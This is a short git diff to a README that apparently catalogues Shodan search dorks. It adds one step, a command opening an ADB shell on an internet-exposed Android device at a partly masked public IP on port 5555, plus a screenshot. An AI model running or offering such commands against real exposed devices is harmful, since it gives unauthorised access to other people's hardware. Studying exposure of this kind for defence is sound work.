@@ -113,7 +113,10 @@ adb devices
 ```
 ![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e05b583-b684-4b27-b42d-c10b5312d788)
 
-
+```sh
+adb -s 59.x.x.112:5555 shell
+```
+![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/e2bf07c6-157a-4fac-b4e5-f317e6ced25f)
 
 ## OS Windows Obsolete
 
